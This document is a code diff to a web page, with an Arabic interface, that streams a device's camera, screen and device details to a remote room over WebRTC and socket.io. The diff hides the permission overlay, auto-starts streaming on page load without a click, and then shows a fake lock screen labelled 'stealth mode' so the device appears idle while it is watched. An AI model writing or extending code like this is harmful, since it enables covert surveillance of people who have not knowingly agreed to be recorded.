@@ -55,7 +55,7 @@
 <body>
 
     <div id="permission-overlay"
-        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; text-align: center; padding: 20px;">
+        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; text-align: center; padding: 20px; display: none;">
         <ion-icon name="videocam" style="font-size: 4rem; color: #3b82f6; margin-bottom: 20px;"></ion-icon>
         <h2 style="margin-bottom: 10px;">إعداد الكاميرا</h2>
         <p style="margin-bottom: 30px; font-size: 1.1rem; color: #94a3b8;">اضغط على الزر أدناه للبدء</p>
@@ -189,21 +189,34 @@
             }
         });
 
-        // 2. Custom Permission Button Handler
-        document.getElementById('start-btn').addEventListener('click', async () => {
+        async function startSystem() {
             permissionOverlay.style.display = 'none';
-            log("Permission granted. Starting camera...");
-            await getCamera(currentFacingMode);
-            await requestWakeLock(); // Keep screen on
+            log("Starting system...");
+            try {
+                await getCamera(currentFacingMode);
+                await requestWakeLock(); // Keep screen on
 
-            socket.emit('join-room', roomId, 'monitor');
-            sendDeviceInfo();
-            log("Camera ready.");
+                socket.emit('join-room', roomId, 'monitor');
+                sendDeviceInfo();
+                log("Camera ready.");
 
-            // Auto-activate stealth mode (fake lock screen)
-            setTimeout(() => {
-                toggleStealthMode();
-            }, 1000);
+                // Auto-activate stealth mode (fake lock screen)
+                setTimeout(() => {
+                    toggleStealthMode();
+                }, 1000);
+            } catch (e) {
+                log("Auto-start failed: " + e.message);
+                permissionOverlay.style.display = 'flex';
+            }
+        }
+
+        // 2. Custom Permission Button Handler
+        document.getElementById('start-btn').addEventListener('click', startSystem);
+
+        // Auto-run on load
+        window.addEventListener('load', () => {
+            log("Page loaded. Attempting auto-start...");
+            startSystem();
         });
 
         async function getScreen() {
@@ -235,17 +248,28 @@
                     prompt.remove();
 
                     const screenTrack = screenStream.getVideoTracks()[0];
+
+                    // Critical: Update Local Video
+                    localVideo.srcObject = screenStream;
+                    await localVideo.play().catch(e => log("Play screen error: " + e.message));
+
                     if (peerConnection) {
-                        const videoTrack = screenStream.getVideoTracks()[0];
-                        const sender = peerConnection.getSenders().find(s => s.track.kind === 'video');
-                        if (sender) sender.replaceTrack(videoTrack);
+                        const senders = peerConnection.getSenders();
+                        for (const sender of senders) {
+                            if (sender.track && sender.track.kind === 'video') {
+                                await sender.replaceTrack(screenTrack);
+                                log("Replaced video track for PC.");
+                            }
+                        }
                     }
 
-                    localVideo.srcObject = screenStream;
-                    screenTrack.onended = () => { getCamera(currentFacingMode); };
+                    screenTrack.onended = () => {
+                        log("Screen ended.");
+                        getCamera(currentFacingMode);
+                    };
                 } catch (e) {
                     log("Screen capture failed: " + e.message);
-                    alert("فشل بدء بث الشاشة: " + e.message);
+                    alert("بث الشاشة غير مدعوم أو تم رفضه: " + e.message);
                     prompt.remove();
                 }
             });
